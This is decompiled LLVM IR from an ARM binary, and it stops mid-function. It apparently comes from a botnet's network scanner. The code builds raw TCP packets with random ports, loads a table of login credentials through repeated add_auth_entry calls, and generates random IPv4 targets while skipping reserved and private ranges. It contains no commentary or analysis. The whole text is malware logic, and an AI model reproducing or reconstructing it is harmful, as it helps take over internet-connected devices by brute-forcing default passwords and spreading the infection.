dec_label_pc_e688:                                ; preds = %dec_label_pc_e664
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_e68c = load i32, i32* @r5, align 4
  store i32 %v0_e68c, i32* @r2, align 4
  %v2_e690 = call i32 @__libc_fcntl(i32 %v3_e670, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e698 = or i32 %v2_e690, 2048
  store i32 %v1_e698, i32* @r2, align 4
  %v0_e69c = load i32, i32* @r4, align 4
  store i32 %v0_e69c, i32* %r0.global-to-local, align 4
  %v2_e6a0 = call i32 @__libc_fcntl(i32 %v0_e69c, i32 4)
  %v2_e6a8 = load i32, i32* @global_var_2474c.153, align 4
  store i32 %v2_e6a8, i32* %r0.global-to-local, align 4
  %v2_e6ac = ptrtoint i8* %stack_var_-56 to i32
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_e6b4 = load i32, i32* @r5, align 4
  store i32 %v0_e6b4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_e6bc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e6bc, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_e6cc = call i32 @__GI_setsockopt(i32 %v2_e6a8, i32 %v0_e6b4, i32 3, i32 %v2_e6bc, i32 4)
  store i32 %v5_e6cc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e6d0 = icmp eq i32 %v5_e6cc, 0
  store i1 %v2_e6d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e6d0, label %dec_label_pc_e6d8, label %dec_label_pc_fc2c

dec_label_pc_e6d8:                                ; preds = %dec_label_pc_e688, %dec_label_pc_e6d8
  %v0_e6d8 = call i32 @rand_next()
  %v3_e6dc = mul i32 %v0_e6d8, 65536
  store i32 %v3_e6dc, i32* %r0.global-to-local, align 4
  %v1_e6e4 = mul i32 %v0_e6d8, 256
  %v3_e6e8 = and i32 %v1_e6e4, 65280
  %tmp372 = udiv i32 %v0_e6d8, 256
  %v4_e6ec = urem i32 %tmp372, 256
  %v5_e6ec = or i32 %v4_e6ec, %v3_e6e8
  store i32 %v5_e6ec, i32* %r3.global-to-local, align 4
  %v2_e6f0 = icmp ugt i32 %v5_e6ec, 1023
  store i1 %v2_e6f0, i1* %cpsr_c.global-to-local, align 1
  %v7_e6f0 = icmp eq i32 %v5_e6ec, 1024
  store i1 %v7_e6f0, i1* %cpsr_z.global-to-local, align 1
  %v3_e6f8 = icmp ult i32 %v5_e6ec, 1022
  br i1 %v3_e6f8, label %dec_label_pc_e6d8, label %dec_label_pc_e6fc

dec_label_pc_e6fc:                                ; preds = %dec_label_pc_e6d8
  %v5_e6f4.le = trunc i32 %v0_e6d8 to i16
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %r0.global-to-local, align 4
  %v2_e700 = load i8, i8* bitcast (i8** @global_var_21c34.155 to i8*), align 4
  %v3_e700 = zext i8 %v2_e700 to i32
  %v1_e704 = and i32 %v3_e700, 240
  %v1_e708 = or i32 %v1_e704, 5
  store i32 %v1_e708, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 10240, i32* %r1.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_21c34.155 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_21c36.156 to i16*), align 4
  %v0_e728 = call i32 @rand_next()
  %v1_e728 = trunc i32 %v0_e728 to i16
  %v3_e730 = load i8, i8* @global_var_21c54.159, align 1
  store i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %ip.global-to-local, align 4
  %v1_e740 = urem i8 %v3_e730, 16
  store i16 %v1_e728, i16* bitcast (i32* @global_var_21c38.160 to i16*), align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v1_e750 = or i8 %v1_e740, 80
  store i8 64, i8* bitcast (i32* @global_var_21c3c.161 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_21c3d.162 to i8*), align 4
  store i8 %v1_e750, i8* @global_var_21c54.159, align 1
  %v4_e760 = sext i16 %v5_e6f4.le to i32
  store i32 %v4_e760, i32* %r1.global-to-local, align 4
  store i32 5888, i32* %r0.global-to-local, align 4
  store i16 5888, i16* @global_var_21c4a.163, align 2
  store i16 %v5_e6f4.le, i16* @global_var_21c48.158, align 2
  %v0_e770 = call i32 @rand_next()
  %v1_e770 = trunc i32 %v0_e770 to i16
  %v3_e778 = load i8, i8* @global_var_21c55.164, align 1
  %v4_e778 = zext i8 %v3_e778 to i32
  store i32 ptrtoint (i16* @global_var_21c48.158 to i32), i32* %ip.global-to-local, align 4
  %v1_e780 = or i32 %v4_e778, 2
  store i32 %v1_e780, i32* %r3.global-to-local, align 4
  store i16 %v1_e770, i16* bitcast (i32* @global_var_21c56.165 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_1929c.167 to i32), i32* %r1.global-to-local, align 4
  %v1_e78c = trunc i32 %v1_e780 to i8
  store i8 %v1_e78c, i8* @global_var_21c55.164, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_e798 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint (i32* @global_var_1929c.167 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_192a0.171 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e7a8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint ([5 x i8]* @global_var_192a0.171 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_192a8.173 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7b8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint ([9 x i8]* @global_var_192a8.173 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_192b4.175 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_192b4.175 to i32), i32* %r1.global-to-local, align 4
  %v5_e7c8 = call i32 @add_auth_entry(i32 ptrtoint ([7 x i8]* @global_var_192b4.175 to i32), i32 ptrtoint ([7 x i8]* @global_var_192b4.175 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1929c.167 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e7d8 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32 ptrtoint (i32* @global_var_1929c.167 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_192c4.179 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e7e8 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint ([9 x i8]* @global_var_192c4.179 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_192d0.181 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192d0.181 to i32), i32* %r1.global-to-local, align 4
  %v5_e7f8 = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_192d0.181 to i32), i32 ptrtoint ([6 x i8]* @global_var_192d0.181 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192d8.183 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e808 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint ([6 x i8]* @global_var_192d8.183 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_192e0.185 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_192e0.185 to i32), i32* %r1.global-to-local, align 4
  %v5_e818 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192e0.185 to i32), i32 ptrtoint ([8 x i8]* @global_var_192e0.185 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e828 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_192e8.187 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e838 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint (i32* @global_var_192e8.187 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192f8.189 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e848 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19298.169 to i32), i32 ptrtoint ([6 x i8]* @global_var_192f8.189 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), i32* %r1.global-to-local, align 4
  %v5_e858 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_192f8.189 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e868 = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19300.191 to i32), i32 ptrtoint ([6 x i8]* @global_var_192f8.189 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19308.193 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e878 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32 ptrtoint (i32* @global_var_19308.193 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19314.195 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e888 = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_192bc.177 to i32), i32 ptrtoint (i32* @global_var_19314.195 to i32), i32 15)
  store i32 %v4_e888, i32* %r0.global-to-local, align 4
  %v2_e890 = ptrtoint i32* %stack_var_-1866 to i32
  store i32 %v2_e890, i32* @lr, align 4
  %v1_ebbc = add i32 %v2_e890, 20
  %v1_ec10 = add i32 %v2_e890, 16
  %v2_ec10 = inttoptr i32 %v1_ec10 to i32*
  %v1_ec24 = add i32 %v2_e890, 9
  %v2_ec24 = inttoptr i32 %v1_ec24 to i8*
  %v1_ecb8 = add i32 %v2_e890, 12
  %v2_ecb8 = inttoptr i32 %v1_ecb8 to i32*
  %v2_ee9c = ptrtoint i32* %stack_var_-40 to i32
  %v2_eee4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_eee8 = ptrtoint i32* %stack_var_-224 to i32
  %v2_eeec = ptrtoint i32* %stack_var_-352 to i32
  %v2_f8c0 = ptrtoint i32* %stack_var_-45 to i32
  %v2_f8d4 = ptrtoint i32* %stack_var_-77 to i32
  %v2_f82c = ptrtoint i32* %stack_var_-60 to i32
  %v2_f9e8 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e8b8 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e898

dec_label_pc_e898:                                ; preds = %dec_label_pc_f080, %dec_label_pc_e6fc
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e6fc ], [ %stack_var_-1876.1, %dec_label_pc_f080 ]
  store i32 ptrtoint (i32* @global_var_21c64.139 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e8a0 = load i32, i32* @global_var_21c64.139, align 4
  store i32 %v2_e8a0, i32* @r4, align 4
  %v3_e8a4 = icmp uge i32 %stack_var_-1876.0, %v2_e8a0
  store i1 %v3_e8a4, i1* %cpsr_c.global-to-local, align 1
  %v9_e8a4 = icmp eq i32 %stack_var_-1876.0, %v2_e8a0
  store i1 %v9_e8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e8a4, label %dec_label_pc_ebac, label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %dec_label_pc_e898
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 %v2_e8b8, i32* @r5, align 4
  br label %dec_label_pc_e8bc

dec_label_pc_e8bc:                                ; preds = %bb407, %dec_label_pc_e8ac
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e8d0 = call i32 @rand_next()
  %v1_e8d0 = trunc i32 %v0_e8d0 to i16
  store i32 %v0_e8d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2472c.58 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_21c34.155 to i32), i32* %ip.global-to-local, align 4
  %v2_e8dc = load i32, i32* @global_var_2472c.58, align 4
  store i32 %v2_e8dc, i32* %r3.global-to-local, align 4
  store i16 %v1_e8d0, i16* bitcast (i32* @global_var_21c38.160 to i16*), align 4
  store i32 %v2_e8dc, i32* @global_var_21c40.196, align 4
  br label %dec_label_pc_e8e8

dec_label_pc_e8e8:                                ; preds = %dec_label_pc_ea40, %dec_label_pc_e918, %dec_label_pc_ea74, %dec_label_pc_ea68, %dec_label_pc_ea5c, %dec_label_pc_ea50, %.thread48, %.thread32, %.thread28, %.thread24, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e9b4, %dec_label_pc_e9ac, %bb383, %dec_label_pc_e97c, %dec_label_pc_e958, %bb376, %dec_label_pc_e928, %bb375, %dec_label_pc_e910, %bb374, %bb398, %bb397, %bb396, %bb395, %bb400, %dec_label_pc_e8bc
  %v0_e8e8 = call i32 @rand_next()
  store i32 %v0_e8e8, i32* %r0.global-to-local, align 4
  %v1_e8ec = urem i32 %v0_e8e8, 256
  store i32 %v1_e8ec, i32* %r1.global-to-local, align 4
  %v3_e8f0 = udiv i32 %v0_e8e8, 256
  store i32 %v3_e8f0, i32* %r3.global-to-local, align 4
  %v3_e8f4 = udiv i32 %v0_e8e8, 65536
  store i32 %v3_e8f4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8f8 = icmp eq i32 %v1_e8ec, 0
  store i1 %v2_e8f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8f8, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e8e8
  %v3_e8fc = icmp ugt i32 %v1_e8ec, 126
  store i1 %v3_e8fc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8fc = icmp eq i32 %v1_e8ec, 127
  store i1 %v8_e8fc, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e8e8, %bb373
  %v0_e90c = phi i1 [ true, %dec_label_pc_e8e8 ], [ %v8_e8fc, %bb373 ]
  %v1_e900 = urem i32 %v3_e8f0, 256
  store i32 %v1_e900, i32* %ip.global-to-local, align 4
  %v1_e904 = urem i32 %v3_e8f4, 256
  store i32 %v1_e904, i32* %r2.global-to-local, align 4
  %v1_e908 = and i32 %v0_e8e8, 8388608
  %v2_e908 = icmp ne i32 %v1_e908, 0
  store i1 %v2_e908, i1* %cpsr_c.global-to-local, align 1
  %v3_e908 = udiv i32 %v0_e8e8, 16777216
  store i32 %v3_e908, i32* %r0.global-to-local, align 4
  br i1 %v0_e90c, label %dec_label_pc_e8e8, label %dec_label_pc_e910

dec_label_pc_e910:                                ; preds = %bb374
  %v2_e910 = icmp ugt i32 %v1_e8ec, 2
  store i1 %v2_e910, i1* %cpsr_c.global-to-local, align 1
  %v7_e910 = icmp eq i32 %v1_e8ec, 3
  store i1 %v7_e910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e910, label %dec_label_pc_e8e8, label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %dec_label_pc_e910
  %v1_e918 = add nsw i32 %v1_e8ec, -15
  store i32 %v1_e918, i32* %r3.global-to-local, align 4
  %v2_e91c = icmp ugt i32 %v1_e8ec, 55
  store i1 %v2_e91c, i1* %cpsr_c.global-to-local, align 1
  %v7_e91c = icmp eq i32 %v1_e8ec, 56
  store i1 %v7_e91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e91c, label %dec_label_pc_e8e8, label %bb375

bb375:                                            ; preds = %dec_label_pc_e918
  %v3_e920 = icmp ne i32 %v1_e918, 0
  store i1 %v3_e920, i1* %cpsr_c.global-to-local, align 1
  %v8_e920 = icmp eq i32 %v1_e918, 1
  store i1 %v8_e920, i1* %cpsr_z.global-to-local, align 1
  %v2_e924 = xor i1 %v3_e920, true
  %v3_e924 = or i1 %v8_e920, %v2_e924
  br i1 %v3_e924, label %dec_label_pc_e8e8, label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %bb375
  %v2_e928 = icmp ugt i32 %v1_e8ec, 9
  store i1 %v2_e928, i1* %cpsr_c.global-to-local, align 1
  %v7_e928 = icmp eq i32 %v1_e8ec, 10
  store i1 %v7_e928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e928, label %dec_label_pc_e8e8, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e928
  %v2_e930 = icmp ugt i32 %v1_e8ec, 191
  store i1 %v2_e930, i1* %cpsr_c.global-to-local, align 1
  %v7_e930 = icmp eq i32 %v1_e8ec, 192
  store i1 %v7_e930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e930, label %bb376, label %dec_label_pc_e93c

bb376:                                            ; preds = %dec_label_pc_e930
  %v3_e934 = icmp ugt i32 %v1_e900, 167
  store i1 %v3_e934, i1* %cpsr_c.global-to-local, align 1
  %v8_e934 = icmp eq i32 %v1_e900, 168
  store i1 %v8_e934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e934, label %dec_label_pc_e8e8, label %dec_label_pc_e93c

dec_label_pc_e93c:                                ; preds = %dec_label_pc_e930, %bb376
  %v7_e93c = icmp eq i32 %v1_e8ec, 172
  %.461 = zext i1 %v7_e93c to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e948 = icmp ugt i32 %v1_e900, 14
  store i1 %v2_e948, i1* %cpsr_c.global-to-local, align 1
  %v7_e948 = icmp eq i32 %v1_e900, 15
  store i1 %v7_e948, i1* %cpsr_z.global-to-local, align 1
  %v2_e94c = xor i1 %v2_e948, true
  %v3_e94c = or i1 %v7_e948, %v2_e94c
  br i1 %v3_e94c, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e93c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e960

bb379:                                            ; preds = %dec_label_pc_e93c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e950 = icmp eq i1 %v7_e93c, false
  store i1 %v2_e950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e950, label %dec_label_pc_e960, label %dec_label_pc_e958

dec_label_pc_e958:                                ; preds = %bb379
  %v2_e958 = icmp ugt i32 %v1_e900, 30
  store i1 %v2_e958, i1* %cpsr_c.global-to-local, align 1
  %v7_e958 = icmp eq i32 %v1_e900, 31
  store i1 %v7_e958, i1* %cpsr_z.global-to-local, align 1
  %v2_e95c = xor i1 %v2_e958, true
  %v3_e95c = or i1 %v7_e958, %v2_e95c
  br i1 %v3_e95c, label %dec_label_pc_e8e8, label %dec_label_pc_e960

dec_label_pc_e960:                                ; preds = %.thread8, %dec_label_pc_e958, %bb379
  %v7_e960 = icmp eq i32 %v1_e8ec, 100
  %.462 = zext i1 %v7_e960 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e96c = icmp ugt i32 %v1_e900, 62
  store i1 %v2_e96c, i1* %cpsr_c.global-to-local, align 1
  %v7_e96c = icmp eq i32 %v1_e900, 63
  store i1 %v7_e96c, i1* %cpsr_z.global-to-local, align 1
  %v2_e970 = xor i1 %v2_e96c, true
  %v3_e970 = or i1 %v7_e96c, %v2_e970
  br i1 %v3_e970, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e960
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e984

bb382:                                            ; preds = %dec_label_pc_e960
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e974 = icmp eq i1 %v7_e960, false
  store i1 %v2_e974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e974, label %dec_label_pc_e984, label %dec_label_pc_e97c

dec_label_pc_e97c:                                ; preds = %bb382
  %v2_e97c = icmp ugt i32 %v1_e900, 125
  store i1 %v2_e97c, i1* %cpsr_c.global-to-local, align 1
  %v7_e97c = icmp eq i32 %v1_e900, 126
  store i1 %v7_e97c, i1* %cpsr_z.global-to-local, align 1
  %v2_e980 = xor i1 %v2_e97c, true
  %v3_e980 = or i1 %v7_e97c, %v2_e980
  br i1 %v3_e980, label %dec_label_pc_e8e8, label %dec_label_pc_e984

dec_label_pc_e984:                                ; preds = %.thread13, %dec_label_pc_e97c, %bb382
  %v2_e984 = icmp ugt i32 %v1_e8ec, 168
  store i1 %v2_e984, i1* %cpsr_c.global-to-local, align 1
  %v7_e984 = icmp eq i32 %v1_e8ec, 169
  store i1 %v7_e984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e984, label %bb383, label %dec_label_pc_e990

bb383:                                            ; preds = %dec_label_pc_e984
  %v3_e988 = icmp eq i32 %v1_e900, 255
  store i1 %v3_e988, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e988, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e988, label %dec_label_pc_e8e8, label %dec_label_pc_e990

dec_label_pc_e990:                                ; preds = %dec_label_pc_e984, %bb383
  %v7_e990 = icmp eq i32 %v1_e8ec, 198
  %.463 = zext i1 %v7_e990 to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e99c = icmp ugt i32 %v1_e900, 16
  store i1 %v2_e99c, i1* %cpsr_c.global-to-local, align 1
  %v7_e99c = icmp eq i32 %v1_e900, 17
  store i1 %v7_e99c, i1* %cpsr_z.global-to-local, align 1
  %v2_e9a0 = xor i1 %v2_e99c, true
  %v3_e9a0 = or i1 %v7_e99c, %v2_e9a0
  br i1 %v3_e9a0, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e990
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9b4

bb386:                                            ; preds = %dec_label_pc_e990
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9a4 = icmp eq i1 %v7_e990, false
  store i1 %v2_e9a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9a4, label %dec_label_pc_e9b4, label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %bb386
  %v2_e9ac = icmp ugt i32 %v1_e900, 18
  store i1 %v2_e9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_e9ac = icmp eq i32 %v1_e900, 19
  store i1 %v7_e9ac, i1* %cpsr_z.global-to-local, align 1
  %v2_e9b0 = xor i1 %v2_e9ac, true
  %v3_e9b0 = or i1 %v7_e9ac, %v2_e9b0
  br i1 %v3_e9b0, label %dec_label_pc_e8e8, label %dec_label_pc_e9b4

dec_label_pc_e9b4:                                ; preds = %.thread19, %dec_label_pc_e9ac, %bb386
  %v2_e9b4 = icmp ugt i32 %v1_e8ec, 222
  store i1 %v2_e9b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b4 = icmp eq i32 %v1_e8ec, 223
  store i1 %v7_e9b4, i1* %cpsr_z.global-to-local, align 1
  %v2_e9b8 = xor i1 %v7_e9b4, true
  %v3_e9b8 = and i1 %v2_e9b4, %v2_e9b8
  br i1 %v3_e9b8, label %dec_label_pc_e8e8, label %dec_label_pc_e9bc

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_e9b4
  %v7_e9bc = icmp eq i32 %v1_e8ec, 106
  %.464 = zext i1 %v7_e9bc to i32
  %v2_e9c8 = icmp ugt i32 %v1_e900, 185
  store i1 %v2_e9c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9c8 = icmp eq i32 %v1_e900, 186
  store i1 %v7_e9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9c8, label %bb389, label %dec_label_pc_e9d4

bb389:                                            ; preds = %dec_label_pc_e9bc
  %v2_e9bc = icmp ugt i32 %v1_e8ec, 105
  store i1 %v2_e9bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9bc, label %dec_label_pc_e8e8, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9bc, %bb389
  %v2_e9d4 = icmp ugt i32 %v1_e900, 186
  store i1 %v2_e9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d4 = icmp eq i32 %v1_e900, 187
  store i1 %v7_e9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d4, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e9d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9e8

.thread24:                                        ; preds = %dec_label_pc_e9d4
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9e0 = icmp eq i1 %v7_e9bc, false
  store i1 %v2_e9e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9e0, label %dec_label_pc_e9e8, label %dec_label_pc_e8e8

dec_label_pc_e9e8:                                ; preds = %.thread25, %.thread24
  %v2_e9e8 = icmp ugt i32 %v1_e900, 184
  store i1 %v2_e9e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e8 = icmp eq i32 %v1_e900, 185
  store i1 %v7_e9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e8, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e9e8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9fc

.thread28:                                        ; preds = %dec_label_pc_e9e8
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9f4 = icmp eq i1 %v7_e9bc, false
  store i1 %v2_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9f4, label %dec_label_pc_e9fc, label %dec_label_pc_e8e8

dec_label_pc_e9fc:                                ; preds = %.thread29, %.thread28
  %v2_e9fc = icmp ugt i32 %v1_e900, 183
  store i1 %v2_e9fc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9fc = icmp eq i32 %v1_e900, 184
  store i1 %v7_e9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9fc, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e9fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ea10

.thread32:                                        ; preds = %dec_label_pc_e9fc
